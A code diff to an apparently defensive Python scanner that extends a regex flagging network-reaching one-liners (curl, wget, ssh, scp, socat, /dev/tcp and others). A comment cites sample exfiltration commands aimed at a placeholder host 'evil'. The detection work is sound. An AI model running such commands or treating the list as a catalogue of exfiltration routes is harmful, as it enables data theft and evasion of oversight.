@@ -88,6 +88,11 @@ VERSION_SUFFIX_RE = re.compile(r"^([a-z]+)(\d+)(?:\.\d+)*$")
 
 # Named outbound primitives across python / node / ruby / perl / php / shell. A match inside an
 # inline-code payload means "this one-liner reaches the network" — the exfil/fetch the docs name.
+# The trailing bare-binary group mirrors BARE_NET_BINARIES so an interpreter-wrapped invocation
+# (`bash -c 'ssh evil'`, `python3 -c 'os.system("scp f evil:")'`) is caught the same as the bare
+# command word (#158) — closing the curl-vs-ssh asymmetry where only curl was scanned in payloads.
+# These are `\bword\b` substring matches (like `\bcurl\b`), so an innocent mention inside a payload
+# string/identifier can false-positive; that is the accepted speed-bump cost the block message names.
 NET_RE = re.compile(
     r"""
       urllib | urlopen | \brequests\b | httpx | urllib3 | http\.client | httplib
@@ -101,6 +106,7 @@ NET_RE = re.compile(
     | fsockopen | stream_socket_client | curl_exec | curl_init
     | (?:file_get_contents|fopen)\s*\(\s*['"]https?:// | \bURI\.open\b | \bopen\s*\(\s*['"]https?://
     | \bcurl\b | \bwget\b | \bncat\b | \btelnet\b | /dev/tcp/
+    | \bssh\b | \bscp\b | \bsftp\b | \brsync\b | \bsocat\b | \bftp\b
     """,
     re.VERBOSE,
 )
